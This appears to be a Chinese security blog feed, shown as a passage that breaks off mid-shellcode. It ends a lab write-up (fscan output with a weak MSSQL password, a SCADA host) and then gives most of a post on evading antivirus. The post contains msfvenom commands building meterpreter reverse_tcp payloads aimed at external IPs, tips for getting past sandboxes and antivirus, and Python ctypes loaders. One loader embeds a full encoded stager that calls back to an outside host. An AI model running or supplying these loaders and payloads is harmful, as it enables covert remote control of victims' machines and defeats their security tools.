href="https://github.com/k4sth4/SeBackupPrivilege">https://github.com/k4sth4/SeBackupPrivilege</a></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734615826880-46932d3b-5796-487d-9a1c-55aeac3f9bce.png" alt=""></p><p>拿到flag</p><p>继续用fscan扫描一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">./fscan -h <span class="number">172.22</span><span class="number">.26</span><span class="number">.1</span>/<span class="number">24</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">___ _</span><br><span class="line"></span><br><span class="line">/ _ \ ___ ___ _ __ __ _ ___| | __</span><br><span class="line"></span><br><span class="line">/ /_\/____/ __|/ __| <span class="string">&#x27;__/ _` |/ __| |/ /</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/ /_\\_____\__ \ (__| | | (_| | (__| &lt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\____/ |___/\___|_| \__,_|\___|_|\_\</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fscan version: 1.8.4</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">start infoscan</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">(icmp) Target 172.22.26.11 is alive</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] Icmp alive hosts len is: 1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">172.22.26.11:445 open</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">172.22.26.11:139 open</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">172.22.26.11:80 open</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">172.22.26.11:135 open</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">172.22.26.11:1433 open</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] alive ports len is: 5</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">start vulscan</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] NetBios 172.22.26.11 WORKGROUP\WIN-SCADA</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] mssql 172.22.26.11:1433:sa 123456</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] NetInfo</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*]172.22.26.11</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[-&gt;]WIN-SCADA</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[-&gt;]172.22.26.11</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] WebTitle http://172.22.26.11 code:200 len:703 title:IIS Windows Server</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">已完成 5/5</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] 扫描结束,耗时: 4.784177011s</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><p>看关键点 rdp连接一下</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734614506855-1796f68a-d584-4e60-946c-fab800f60fec.png" alt=""></p><p>点击锅炉开拿到一个flag</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734614620054-999d6ab2-bd88-4889-8a91-9a43f288f7c7.png" alt=""></p><p>可以看到最后一个数据库为空其实是被勒索加密了 <img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734614654940-f2be1b6a-c572-47dc-9e6f-4756eb98cd0c.png" alt=""></p><p>桌面有被加密的文件，密钥信息在文件描述里,这部分参考<br><a href="https://fushuling.com/index.php/2024/03/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-thermalpower/">https://fushuling.com/index.php/2024/03/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-thermalpower/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;信息收集&quot;&gt;信息收集&lt;/h2&gt;
&lt;p&gt;目录扫描&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/173</summary>
      
    
    
    
    <category term="攻防渗透" scheme="https://oceanzbz.github.io/categories/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="渗透测试" scheme="https://oceanzbz.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    <category term="域渗透" scheme="https://oceanzbz.github.io/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
    <category term="春秋云镜" scheme="https://oceanzbz.github.io/tags/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/"/>
    
  </entry>
  
  <entry>
    <title>静态免杀入门</title>
    <link href="https://oceanzbz.github.io/post/6b76fb73.html"/>
    <id>https://oceanzbz.github.io/post/6b76fb73.html</id>
    <published>2024-12-30T07:08:06.000Z</published>
    <updated>2025-03-05T07:24:36.813Z</updated>
    
    <content type="html"><![CDATA[<h2 id="shellcode-loader">shellcode loader</h2><p>shellcode要想执行需要经历如下几个过程：</p><ol><li>申请一块内存；</li><li>把shellcode加载到这块内存；</li><li>执行这块内存。</li></ol><p>这过程中需要注意如下几点：</p><ol><li>加载dll，采用动态调用的方式，可以避免IAT的hook；</li><li>不要直接申请rwx(读写执行)的内存，可先申请rw内存，后面再改为可执行，杀软对rwx的内存很敏感；</li><li>加载到内存的方法非常多，除了常见的copy和move还有uuid这种加载既能达到加密shellcode的效果，还能直接加载到内存；</li><li>执行内存，还可以用回调来触发如EnumChildWindows；</li><li>API调用中间可以插入一些没用的代码，打乱API调用；</li><li>适当加一些sleep，可以过一些沙箱。</li></ol><h2 id="shellcode变异加密混淆回调执行代码">shellcode变异加密混淆回调执行代码</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">C/C++-ShellCode分析-OD&amp;IDA&amp;朔源</span></span><br><span class="line">1、EXE朔源-IP及端口-杀毒分析</span><br><span class="line">2、编译修改-IP及端口-威胁感知</span><br><span class="line">reverse_tcp.asm</span><br><span class="line">https://www.cnblogs.com/Akkuman/p/12859091.html</span><br><span class="line">https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/payload/windows/reverse_tcp.rb</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">C/C++-ShellCode变异-编码混淆加密算法</span></span><br><span class="line">Xor Aes Hex Rc4 Rsa等</span><br><span class="line">https://github.com/Arno0x/ShellcodeWrapper</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 6 -b &#x27;\x00&#x27; lhost=47.94.236.117 lport=3333 -f raw &gt; shellcode.raw</span><br><span class="line">1、python2 shellcode_encoder.py -cpp -cs -py shellcode.raw xiaodi xor</span><br><span class="line">CS&amp;MSF</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 6 -b &#x27;\x00&#x27; lhost=47.94.236.117 lport=3333 -f raw &gt; shellcode.raw</span><br><span class="line">python xor.py -s shellcode.bin  -d payload.c -n 10 -r out.bin</span><br><span class="line">2、python2 shellcode_encoder.py -cpp -cs -py shellcode.raw xiaodi aes</span><br><span class="line">3、Hex</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=47.94.236.117 lport=6688 -f c</span><br><span class="line">https://gchq.github.io/CyberChef/</span><br><span class="line">https://github.com/ByPassAVTeam/ShellcodeLoader</span><br><span class="line">LoaderMaker.exe download.dat(hex数据) xiaodi.exe(生成文件名)</span><br><span class="line">4、Rc4</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=47.94.236.117 lport=6688 -f c </span><br><span class="line">https://blog.csdn.net/weixin_45590789/article/details/105536623</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">C/C++-回调执行代码-汇编&amp;句柄&amp;API&amp;UI等</span></span><br><span class="line">Callback_Shellcode_Injection-main</span><br><span class="line">https://github.com/ChaitanyaHaritash/Callback_Shellcode_Injection</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="加载器">加载器</h2><p><a href="https://shu1l.github.io/2021/08/17/mian-sha-xue-xi-shellcode-jia-zai-mian-sha/">https://shu1l.github.io/2021/08/17/mian-sha-xue-xi-shellcode-jia-zai-mian-sha/</a></p><p><a href="https://xz.aliyun.com/t/9385">https://xz.aliyun.com/t/9385</a></p><p><a href="https://xz.aliyun.com/t/12253">https://xz.aliyun.com/t/12253</a></p><h3 id="python加载器">python加载器</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line">shellcode = <span class="built_in">bytearray</span>(<span class="string">&quot;\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#通过调用VirtualAlloc函数，申请一块动态内存区域</span></span><br><span class="line">ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(<span class="number">0</span>),<span class="comment">#要分配的内存区域的地址</span></span><br><span class="line">                                          ctypes.c_int(<span class="built_in">len</span>(shellcode)), <span class="comment">#分配的大小</span></span><br><span class="line">                                          ctypes.c_int(<span class="number">0x3000</span>), <span class="comment">#分配的类型</span></span><br><span class="line">                                          ctypes.c_int(<span class="number">0x40</span>)) <span class="comment">#该内存的初始保护属性</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">buf = (ctypes.c_char * <span class="built_in">len</span>(shellcode)).from_buffer(shellcode)</span><br><span class="line"></span><br><span class="line"><span class="comment">#调用RtlMoveMemory函数，函数从我们指定的内存复制内容到另一内存</span></span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),</span><br><span class="line">                                    buf,</span><br><span class="line">                                    ctypes.c_int(<span class="built_in">len</span>(shellcode)))</span><br><span class="line"></span><br><span class="line"><span class="comment">#调用CreateThread将在主线程的基础上创建一个新线程</span></span><br><span class="line">ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">                                         ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">                                         ctypes.c_int(ptr),</span><br><span class="line">                                         ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">                                         ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">                                         ctypes.pointer(ctypes.c_int(<span class="number">0</span>)))</span><br><span class="line"></span><br><span class="line"><span class="comment">#调用WaitForSingleObject函数等待创建的线程运行结束。</span></span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-<span class="number">1</span>))</span><br></pre></td></tr></table></figure><p>代码不是很长，可以看到主要调用的就是ctypes这个库。</p><p>ctypes 是 Python 的外部函数库。它提供了与 C 兼容的数据类型，并允许调用 DLL 或共享库中的函数。可使用该模块以纯 Python 形式对这些库进行封装。</p><p>主要流程</p><ul><li>调用VirtualAlloc函数，来申请一块可读可写可执行的动态内存区域。</li><li>调用RtlMoveMemory函数，此函数从指定内存中复制内容至另一内存里。</li><li>调用CreateThread函数，在主线程的基础上创建一个新线程。</li><li>调用WaitForSingleObject函数，等待创建的线程运行结束。</li></ul><p>当然目前来说这种比较原始的方式杀软已经杀很严了，所以之后更多要有混淆加密的操作。</p><p>常见的有Hex加密、AES加密、XOR加密、base64等等，或者可以自己写加密和解密，免杀效果会更好</p><h4 id="HEX加密">HEX加密</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="comment"># length: 894 bytes</span></span><br><span class="line">buf = <span class="string">b&quot;\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4f\xff\xff\xff\x5d\x6a\x00\x49\xbe\x77\x69\x6e\x69\x6e\x65\x74\x00\x41\x56\x49\x89\xe6\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x48\x31\xc9\x48\x31\xd2\x4d\x31\xc0\x4d\x31\xc9\x41\x50\x41\x50\x41\xba\x3a\x56\x79\xa7\xff\xd5\xeb\x73\x5a\x48\x89\xc1\x41\xb8\x60\x11\x00\x00\x4d\x31\xc9\x41\x51\x41\x51\x6a\x03\x41\x51\x41\xba\x57\x89\x9f\xc6\xff\xd5\xeb\x59\x5b\x48\x89\xc1\x48\x31\xd2\x49\x89\xd8\x4d\x31\xc9\x52\x68\x00\x02\x40\x84\x52\x52\x41\xba\xeb\x55\x2e\x3b\xff\xd5\x48\x89\xc6\x48\x83\xc3\x50\x6a\x0a\x5f\x48\x89\xf1\x48\x89\xda\x49\xc7\xc0\xff\xff\xff\xff\x4d\x31\xc9\x52\x52\x41\xba\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x85\x9d\x01\x00\x00\x48\xff\xcf\x0f\x84\x8c\x01\x00\x00\xeb\xd3\xe9\xe4\x01\x00\x00\xe8\xa2\xff\xff\xff\x2f\x4a\x4f\x78\x4c\x00\x03\x8b\x02\x94\xad\x26\x3e\xe1\xe1\xa4\x48\xe2\xc0\xf1\x5b\x10\x17\x75\x09\x3f\x3d\xfa\xd0\xf9\xc2\x70\x02\xb3\xeb\x7c\x2d\x70\xfb\x34\x9e\x0e\x3e\x47\xcd\x1d\xc3\x4c\x0c\x33\x8b\xce\x7b\x5b\x2a\xdb\x40\xbc\x9b\x5e\x7b\x9a\x53\x88\x7e\x93\xf0\xbe\x6c\xde\x11\x29\x2d\xae\x8e\xa2\x39\xe5\x4f\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x39\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x31\x3b\x20\x57\x4f\x57\x36\x34\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x35\x2e\x30\x3b\x20\x42\x4f\x49\x45\x39\x3b\x45\x4e\x55\x53\x29\x0d\x0a\x00\xc6\x24\x6a\xc0\x95\x01\xb9\x1d\x74\x0d\xbf\x57\x5c\x3d\x4a\x7f\x60\xa3\x07\xe6\x08\xb1\x97\x28\xfb\xad\x21\x89\xc1\xd0\x3a\x97\xa6\x22\x1f\xfc\xf2\x84\xa4\x04\x48\x4d\xc3\x69\x8a\x56\xbf\xd8\x30\x44\x11\x09\x9d\xfe\xdb\x1b\x35\xfe\xd7\x4d\x11\x49\x87\x3b\x4d\xaa\x39\x95\x1c\x82\xd3\xf7\x21\xf3\xb6\x46\x0d\x3b\x7d\x66\x84\x3a\xba\xc0\xc7\x42\x21\x27\x69\x3b\xca\x10\x56\xb6\xfa\xe2\xec\x57\xd0\x7f\xbc\xa5\x7d\x30\xd8\x1c\x7e\x53\xc1\xf7\x5b\xd9\xce\x24\x21\x4a\x55\x03\x88\x0e\x72\x80\x51\x5a\x92\x37\x69\x22\xf4\x72\x5e\x9a\x97\xdf\x9c\x28\xa4\x6e\x52\x50\x94\x89\xa3\x74\x69\x4e\x7f\xa5\xd0\x6c\x59\x72\x13\xb5\xf4\xde\x21\x53\x1b\x9f\x52\x83\x86\x76\x93\x9c\x21\xec\xd5\x9c\x31\x17\x60\x03\x27\x71\xc2\x46\xea\xa4\x16\xda\xe3\x6e\x11\xef\x21\x28\xb7\xe8\x5f\x63\x1b\x34\xd9\xf6\xe4\xf6\x2a\x3b\xf6\x00\xda\x13\x93\x88\x00\x41\xbe\xf0\xb5\xa2\x56\xff\xd5\x48\x31\xc9\xba\x00\x00\x40\x00\x41\xb8\x00\x10\x00\x00\x41\xb9\x40\x00\x00\x00\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda\x41\xb8\x00\x20\x00\x00\x49\x89\xf9\x41\xba\x12\x96\x89\xe2\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb6\x66\x8b\x07\x48\x01\xc3\x85\xc0\x75\xd7\x58\x58\x58\x48\x05\x00\x00\x00\x00\x50\xc3\xe8\x9f\xfd\xff\xff\x34\x33\x2e\x31\x33\x38\x2e\x32\x37\x2e\x31\x32\x00\x49\x96\x02\xd2&quot;</span></span><br><span class="line"></span><br><span class="line">shellcode = buf</span><br><span class="line">shellcode = <span class="built_in">bytearray</span>(shellcode)</span><br><span class="line"><span class="comment"># 设置VirtualAlloc返回类型为ctypes.c_uint64</span></span><br><span class="line">ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64</span><br><span class="line"><span class="comment"># 申请内存</span></span><br><span class="line">ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(<span class="number">0</span>), ctypes.c_int(<span class="built_in">len</span>(shellcode)), ctypes.c_int(<span class="number">0x3000</span>), ctypes.c_int(<span class="number">0x40</span>))</span><br><span class="line"><span class="comment"># 放入shellcode</span></span><br><span class="line">buf = (ctypes.c_char * <span class="built_in">len</span>(shellcode)).from_buffer(shellcode)</span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(</span><br><span class="line">    ctypes.c_uint64(ptr),</span><br><span class="line">    buf,</span><br><span class="line">    ctypes.c_int(<span class="built_in">len</span>(shellcode))</span><br><span class="line">)</span><br><span class="line"><span class="comment"># 创建一个线程从shellcode放置位置首地址开始执行</span></span><br><span class="line">handle = ctypes.windll.kernel32.CreateThread(</span><br><span class="line">    ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">    ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">    ctypes.c_uint64(ptr),</span><br><span class="line">    ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">    ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">    ctypes.pointer(ctypes.c_int(<span class="number">0</span>))</span><br><span class="line">)</span><br><span class="line"><span class="comment"># 等待上面创建的线程运行完</span></span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-<span class="number">1</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="Base64混淆">Base64混淆</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="comment"># length: 894 bytes</span></span><br><span class="line"><span class="comment"># buf = b&quot;\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4f\xff\xff\xff\x5d\x6a\x00\x49\xbe\x77\x69\x6e\x69\x6e\x65\x74\x00\x41\x56\x49\x89\xe6\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x48\x31\xc9\x48\x31\xd2\x4d\x31\xc0\x4d\x31\xc9\x41\x50\x41\x50\x41\xba\x3a\x56\x79\xa7\xff\xd5\xeb\x73\x5a\x48\x89\xc1\x41\xb8\x60\x11\x00\x00\x4d\x31\xc9\x41\x51\x41\x51\x6a\x03\x41\x51\x41\xba\x57\x89\x9f\xc6\xff\xd5\xeb\x59\x5b\x48\x89\xc1\x48\x31\xd2\x49\x89\xd8\x4d\x31\xc9\x52\x68\x00\x02\x40\x84\x52\x52\x41\xba\xeb\x55\x2e\x3b\xff\xd5\x48\x89\xc6\x48\x83\xc3\x50\x6a\x0a\x5f\x48\x89\xf1\x48\x89\xda\x49\xc7\xc0\xff\xff\xff\xff\x4d\x31\xc9\x52\x52\x41\xba\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x85\x9d\x01\x00\x00\x48\xff\xcf\x0f\x84\x8c\x01\x00\x00\xeb\xd3\xe9\xe4\x01\x00\x00\xe8\xa2\xff\xff\xff\x2f\x4a\x4f\x78\x4c\x00\x03\x8b\x02\x94\xad\x26\x3e\xe1\xe1\xa4\x48\xe2\xc0\xf1\x5b\x10\x17\x75\x09\x3f\x3d\xfa\xd0\xf9\xc2\x70\x02\xb3\xeb\x7c\x2d\x70\xfb\x34\x9e\x0e\x3e\x47\xcd\x1d\xc3\x4c\x0c\x33\x8b\xce\x7b\x5b\x2a\xdb\x40\xbc\x9b\x5e\x7b\x9a\x53\x88\x7e\x93\xf0\xbe\x6c\xde\x11\x29\x2d\xae\x8e\xa2\x39\xe5\x4f\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x39\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x31\x3b\x20\x57\x4f\x57\x36\x34\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x35\x2e\x30\x3b\x20\x42\x4f\x49\x45\x39\x3b\x45\x4e\x55\x53\x29\x0d\x0a\x00\xc6\x24\x6a\xc0\x95\x01\xb9\x1d\x74\x0d\xbf\x57\x5c\x3d\x4a\x7f\x60\xa3\x07\xe6\x08\xb1\x97\x28\xfb\xad\x21\x89\xc1\xd0\x3a\x97\xa6\x22\x1f\xfc\xf2\x84\xa4\x04\x48\x4d\xc3\x69\x8a\x56\xbf\xd8\x30\x44\x11\x09\x9d\xfe\xdb\x1b\x35\xfe\xd7\x4d\x11\x49\x87\x3b\x4d\xaa\x39\x95\x1c\x82\xd3\xf7\x21\xf3\xb6\x46\x0d\x3b\x7d\x66\x84\x3a\xba\xc0\xc7\x42\x21\x27\x69\x3b\xca\x10\x56\xb6\xfa\xe2\xec\x57\xd0\x7f\xbc\xa5\x7d\x30\xd8\x1c\x7e\x53\xc1\xf7\x5b\xd9\xce\x24\x21\x4a\x55\x03\x88\x0e\x72\x80\x51\x5a\x92\x37\x69\x22\xf4\x72\x5e\x9a\x97\xdf\x9c\x28\xa4\x6e\x52\x50\x94\x89\xa3\x74\x69\x4e\x7f\xa5\xd0\x6c\x59\x72\x13\xb5\xf4\xde\x21\x53\x1b\x9f\x52\x83\x86\x76\x93\x9c\x21\xec\xd5\x9c\x31\x17\x60\x03\x27\x71\xc2\x46\xea\xa4\x16\xda\xe3\x6e\x11\xef\x21\x28\xb7\xe8\x5f\x63\x1b\x34\xd9\xf6\xe4\xf6\x2a\x3b\xf6\x00\xda\x13\x93\x88\x00\x41\xbe\xf0\xb5\xa2\x56\xff\xd5\x48\x31\xc9\xba\x00\x00\x40\x00\x41\xb8\x00\x10\x00\x00\x41\xb9\x40\x00\x00\x00\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x93\x53\x53\x48\x89\xe7